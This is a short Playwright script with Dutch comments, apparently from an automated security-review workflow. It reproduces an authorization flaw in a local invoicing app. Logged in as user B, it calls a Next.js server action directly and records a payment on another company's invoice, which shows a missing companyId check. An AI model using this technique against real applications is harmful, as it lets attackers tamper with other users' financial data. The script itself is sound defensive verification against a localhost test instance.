// Herhaalscript verifier-05: reproduceert security-tester-1-mv6yklfz-nndl (registreerBetalingAction companyId-check).
// Repetitie tegen a2 (mijn toegewezen herhaalgebruiker) in plaats van a1, zoals opgedragen. B is de aanvaller.
const { chromium } = require("@playwright/test");
const { cookie, GEBRUIKERS } = require("/home/user/Kostenplan/scripts/test/ids.js");
const BASE = "http://localhost:3200";
const CHROMIUM = process.env.CHROMIUM_PATH || "/opt/pw-browsers/chromium-1194/chrome-linux/chrome";

(async () => {
  const browser = await chromium.launch({ executablePath: CHROMIUM, args: ["--no-sandbox"] });
  const ctx = await browser.newContext();
  await ctx.addCookies([cookie(GEBRUIKERS.b, BASE)]);
  const page = await ctx.newPage();
  await page.goto(BASE + "/dashboard/profiel", { waitUntil: "networkidle" });

  // a2's "verstuurd" factuur F2026-0001, bedrijf cmv70sbtx004n9s7d186506xx (a2's company1, uit verse seed, niet aan B getoond)
  const factuurIdA2 = "cmv70sbzi007d9s7d30i4r8t1";

  const resp = await page.request.post(BASE + "/dashboard/profiel", {
    headers: {
      "Next-Action": "406f9fbbf7ff50de4da2d8dbf877756ed5488bff6a",
      "content-type": "text/plain;charset=UTF-8",
      "accept": "text/x-component",
    },
    data: JSON.stringify([{ factuurId: factuurIdA2, bedragCenten: 123456, datum: "2026-10-13", methode: "OVERBOEKING", notitie: "verifier-05-repro-B-on-a2-invoice" }]),
  });
  console.log("STATUS", resp.status());
  console.log("BODY", (await resp.text()).slice(0, 500));
  await browser.close();
})();
